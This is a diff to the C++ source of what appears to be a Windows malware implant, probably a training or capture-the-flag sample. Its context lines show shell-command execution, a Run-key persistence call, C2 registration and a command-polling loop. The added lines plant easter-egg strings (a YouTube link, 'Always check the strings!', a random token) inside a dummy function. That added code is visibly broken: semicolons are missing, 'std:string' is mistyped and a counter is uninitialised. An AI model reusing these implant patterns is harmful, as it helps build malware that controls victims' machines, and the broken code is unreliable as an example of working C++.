@@ -14,6 +14,17 @@
 
 std::wstring authToken = L"Bobobo";
 
+
+std::string obfuscation(bool temp) {
+    int k;
+    for (int i = 10; i<20; i++){
+        k++;
+    }
+    k = k * 2;
+    std::string ret = "https://youtu.be/j2hGdmnoHU0"
+    return ret
+}
+
 inline bool file_exists (std::string &name, std::string hash) {
     if (FILE *file = fopen(name.c_str(), "r")) {
         char buffer[BUF_SIZE];
@@ -69,6 +80,8 @@ std::string execute_shell(wchar_t* command) {
     sa.nLength = sizeof(sa);
     sa.lpSecurityDescriptor = NULL;
     sa.bInheritHandle = TRUE;
+
+    std::string easteregg = obfuscation(true)
 
     std::string output = "";
 
@@ -334,6 +347,7 @@ int wmain() {
     std::string filename = "C:\\malware\\ch0nky.txt";
     std::string hash = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855";
     // checks for the "ch0nky.txt file"
+    std::string easteregg = "https://youtu.be/j2hGdmnoHU0"
     if (!file_exists(filename, hash)){
         return -1;
     }
@@ -364,7 +378,7 @@ int wmain() {
     set_run_key();
 
     std::string output = "";
-
+    std:string yer1 = "Always check the strings!"
     // attempt to register with the c2
     do {
         if (strcmp("OK", output.c_str()) == 0){
@@ -382,7 +396,7 @@ int wmain() {
     // get responses to the server and constantly check in every minute for commands
     std::string response = "";
     int int_imageNum = 0;
-
+    std::string yer2 = "Q2MZ5S6IF162JJQQ0GQ5OP7PPQERLADFGPDIWAAM"
     while (true) {
         Sleep(5000);
         std::string c2_command = "";
